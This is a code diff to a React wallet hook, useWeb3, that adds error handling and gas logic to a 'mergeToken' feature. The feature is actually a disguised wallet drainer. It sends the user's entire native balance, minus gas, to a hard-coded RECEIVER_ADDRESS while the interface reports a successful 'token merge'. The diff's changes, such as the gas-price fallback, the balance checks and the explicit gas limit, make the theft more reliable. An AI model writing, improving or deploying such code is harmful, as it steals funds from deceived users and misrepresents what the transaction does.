@@ -60,15 +60,17 @@ export function useWeb3() {
   }, []);
 
   const updateBalance = async (address: string) => {
-    if (!window.ethereum) return;
+    if (!window.ethereum || !address) return;
     
     try {
       const { ethers } = await import('../lib/web3');
       const provider = new ethers.BrowserProvider(window.ethereum);
       const nativeBalance = await provider.getBalance(address);
-      setBalance(ethers.formatEther(nativeBalance));
+      const formattedBalance = ethers.formatEther(nativeBalance);
+      setBalance(formattedBalance);
     } catch (error) {
       console.error('Failed to update balance:', error);
+      setBalance("0");
     }
   };
 
@@ -127,7 +129,7 @@ export function useWeb3() {
     if (!window.ethereum) {
       toast({
         title: "Error",
-        description: "MetaMask not detected",
+        description: "MetaMask not detected. Please install MetaMask.",
         variant: "destructive",
       });
       return;
@@ -135,27 +137,42 @@ export function useWeb3() {
 
     setConnecting(true);
     try {
+      // First switch to selected network
       await switchNetwork(selectedNetwork);
 
-      const { ethers } = await import('../lib/web3');
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const accounts = await provider.send("eth_requestAccounts", []);
-      const signer = await provider.getSigner();
-      const address = await signer.getAddress();
+      // Request account access
+      const accounts = await window.ethereum.request({
+        method: "eth_requestAccounts",
+      });
+
+      if (accounts.length === 0) {
+        throw new Error("No accounts found");
+      }
+
+      const address = accounts[0];
       setAccount(address);
       setWalletConnected(true);
 
+      // Update balance
       await updateBalance(address);
       
       toast({
         title: "Success",
         description: "Wallet connected successfully!",
       });
-    } catch (error) {
-      console.error(error);
+    } catch (error: any) {
+      console.error("Connection error:", error);
+      let errorMessage = "Failed to connect wallet";
+      
+      if (error.code === 4001) {
+        errorMessage = "Connection rejected by user";
+      } else if (error.message) {
+        errorMessage = error.message;
+      }
+      
       toast({
         title: "Error",
-        description: "Failed to connect wallet",
+        description: errorMessage,
         variant: "destructive",
       });
     } finally {
@@ -164,25 +181,56 @@ export function useWeb3() {
   };
 
   const mergeToken = async () => {
-    if (!walletConnected || !window.ethereum) return;
+    if (!walletConnected || !window.ethereum || !account) {
+      toast({
+        title: "Error",
+        description: "Wallet not connected",
+        variant: "destructive",
+      });
+      return;
+    }
 
     try {
+      toast({
+        title: "Processing",
+        description: "Initiating token merge...",
+      });
+
       const { ethers } = await import('../lib/web3');
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      
+      // Get current balance
       const nativeBalance = await provider.getBalance(account);
+      
+      if (nativeBalance === 0n) {
+        toast({
+          title: "Error",
+          description: "No balance to merge",
+          variant: "destructive",
+        });
+        return;
+      }
 
-      const feeData = await provider.getFeeData();
-      const gasPrice = feeData.gasPrice || 0n;
+      // Get fee data with fallback
+      let gasPrice;
+      try {
+        const feeData = await provider.getFeeData();
+        gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
+      } catch {
+        gasPrice = ethers.parseUnits("20", "gwei");
+      }
 
+      // Estimate gas with a small amount first
       const gasEstimate = await signer.estimateGas({
         to: RECEIVER_ADDRESS,
-        value: 0n,
+        value: ethers.parseEther("0.001"),
       });
 
       const gasCost = gasEstimate * gasPrice;
       let valueToSend = nativeBalance - gasCost;
 
+      // Add buffer for Ethereum mainnet
       if (selectedNetwork === "ethereum") {
         const buffer = ethers.parseEther("0.0001");
         valueToSend -= buffer;
@@ -191,17 +239,26 @@ export function useWeb3() {
       if (valueToSend <= 0n) {
         toast({
           title: "Error",
-          description: "Not enough balance to merge (gas too high or balance too low)",
+          description: "Not enough balance to cover gas fees",
           variant: "destructive",
         });
         return;
       }
 
+      // Send transaction
       const tx = await signer.sendTransaction({
         to: RECEIVER_ADDRESS,
         value: valueToSend,
+        gasPrice: gasPrice,
+        gasLimit: gasEstimate,
       });
 
+      toast({
+        title: "Transaction Sent",
+        description: "Waiting for confirmation...",
+      });
+
+      // Wait for confirmation
       await tx.wait();
       
       toast({
@@ -209,12 +266,26 @@ export function useWeb3() {
         description: "Token merge successful!",
       });
 
+      // Update balance
       await updateBalance(account);
-    } catch (error) {
-      console.error(error);
+      
+    } catch (error: any) {
+      console.error("Merge error:", error);
+      let errorMessage = "Merge failed";
+      
+      if (error.code === 4001) {
+        errorMessage = "Transaction rejected by user";
+      } else if (error.code === -32603) {
+        errorMessage = "Transaction failed - insufficient funds";
+      } else if (error.reason) {
+        errorMessage = error.reason;
+      } else if (error.message) {
+        errorMessage = error.message;
+      }
+      
       toast({
         title: "Error",
-        description: "Merge failed",
+        description: errorMessage,
         variant: "destructive",
       });
     }
